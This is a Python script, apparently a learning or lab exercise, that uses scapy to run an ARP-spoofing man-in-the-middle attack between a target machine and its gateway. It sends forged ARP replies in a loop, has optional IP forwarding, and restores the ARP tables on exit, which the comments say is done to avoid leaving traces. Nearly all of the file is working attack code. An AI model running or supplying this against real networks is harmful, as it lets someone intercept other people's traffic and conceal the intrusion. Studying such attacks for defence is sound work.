'''
ARP spoofing MITM attack:

this script uses 3 machines for the attack, 2 of them provided by the user:
gatewayIP and targetIP, third machine IP is the machine running the script(attacker).

steps of script execution:
*** forwarding must be enabled on the machine running the script, the reason for this
is that the kernel receives the packet, looks at its destination address,
the destination isnt the current machine. kernel looks at the routing table and sends
the packet straight to the correct address matching the subnet. 
that way we catch packets and we forward them immidiately to their correct destination.

1. spoof() runs in a loop:
attacker machine sends spoof message to target: gateway has attacker mac.
attacker machine sends spoof message to gateway: target has attacker mac.
2. if script is keyboard interrupted:
- restore() is called to restore original arp tables on both machines, 
as we dont want to leave any traces.
- turning off forwarding.
'''

from scapy.all import send, sendp
from scapy.layers.l2 import getmacbyip, Ether, ARP
import time
import os

def enable_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_forward():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def spoof(attackerMAC, targetMAC, targetIP, gtwMAC, gtwIP):
    '''
    1. attacker sends to target-> attacker ip has gateway mac
    2. attacker sends to gateway-> attacker ip has target mac
    '''
    sendp(Ether(src=attackerMAC, dst=targetMAC)/ \
          ARP(pdst=targetIP, psrc=gtwIP, hwdst=targetMAC, op="is-at"))
    sendp(Ether(src=attackerMAC, dst=gtwMAC)/ \
          ARP(pdst=gtwIP, psrc=targetIP, hwdst=gtwMAC, op="is-at"))

def restoreARP(targetMAC, targetIP, gtwMAC, gtwIP):
    '''
    restore arp table although devices continue exchange who has messages,
    themselves spoof finished
    '''
    send(ARP(pdst=gtwIP, psrc=targetIP, hwdst=gtwMAC, hwsrc=targetMAC, op="is-at"))
    send(ARP(pdst=targetIP, psrc=gtwIP, hwdst=targetMAC, hwsrc=gtwMAC, op="is-at"))

def mitm_arp_spoof():
    # targetIP = input("Enter target IP: ")
    # gatewayIP = input("Enter router IP: ")
    attackerMAC = Ether().src

    targetIP = "192.168.58.10"
    gtwIP = "192.168.58.254"
    
    try:
        targetMAC = getmacbyip(targetIP)
        if targetMAC == None:
            raise Exception('Target IP')
        gtwMAC = getmacbyip(gtwIP)
        if gtwMAC == None:
            raise Exception('Gateway IP')
    except Exception as err:
        print(f'Error: {err}')
    else:
        # enable_forward()
        print(f'attacker mac: {attackerMAC}\n\
              target mac: {targetMAC}\n\
              gateway mac: {gtwMAC}')
        
        while True:
            try:
                spoof(attackerMAC, targetMAC, targetIP, gtwMAC, gtwIP)
                time.sleep(10)
            except KeyboardInterrupt:
                restoreARP(targetMAC, targetIP, gtwMAC, gtwIP)
                break
            
    # disable_forward()

if __name__ == "__main__":
    mitm_arp_spoof()